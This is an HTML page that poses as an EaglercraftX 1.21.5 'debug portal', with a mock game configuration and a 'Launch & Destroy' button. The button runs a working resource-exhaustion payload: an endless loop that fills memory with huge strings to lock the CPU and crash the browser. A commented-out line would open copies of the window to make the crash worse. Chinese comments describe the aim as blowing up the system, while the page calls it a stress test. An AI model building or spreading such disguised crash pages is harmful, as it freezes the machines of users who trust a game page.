<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="System Stress Test Interface" />
    <title>EaglercraftX 1.21.5 - Extreme Test</title>
    
    <script type="text/javascript">
        "use strict";
        // 模拟 Eaglercraft 配置
        window.eaglercraftXOpts = {
            container: "game_frame",
            worldsDB: "worlds",
            relays: [{ addr: "wss://relay.deev.is/", comment: "Relay Test", primary: true }]
        };

        // 核心“干爆”代码：资源枯竭函数
        function startExtremeLoad() {
            console.log("WARNING: Initializing Memory and CPU stress...");
            document.getElementById('status').innerText = "SYSTEM CRITICAL - FREEZING...";
            
            let heavyLoad = [];
            // 无限循环：锁死 CPU 并耗尽 RAM
            while (true) {
                // 每次循环创建 100万个字符的字符串并存入数组（消耗内存）
                heavyLoad.push(new Array(1000000).join('FATAL_ERROR_'));
                
                // 尝试开启大量子窗口（如果浏览器未拦截，会加速系统崩溃）
                // window.open(window.location.href); 
            }
        }
    </script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; overflow: hidden; }
        body { 
            background: #111; 
            color: #ff4444; 
            font-family: 'Courier New', Courier, monospace; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
        }
        #game_frame {
            width: 80%;
            height: 60%;
            border: 5px solid #333;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        .controls {
            text-align: center;
            z-index: 100;
        }
        button { 
            padding: 25px 50px; 
            font-size: 28px; 
            cursor: pointer; 
            background: #aa0000; 
            color: white; 
            border: 3px solid #ff0000; 
            font-weight: bold;
            text-transform: uppercase;
        }
        button:hover { background: #ff0000; }
        #status { margin-top: 15px; color: #777; }
    </style>
</head>
<body>

    <div id="game_frame">
        <p style="color: #555;">[ EaglercraftX Engine Ready ]</p>
    </div>

    <div class="controls">
        <h1>EaglercraftX 1.21.5 Debug Portal</h1>
        <p>This will execute a high-intensity hardware stress test.</p>
        <br>
        <button onclick="startExtremeLoad()">Launch & Destroy</button>
        <p id="status">Status: Idle</p>
    </div>

    <!-- 你的原始图片占位符 (保持结构一致) -->

</body>
</html>
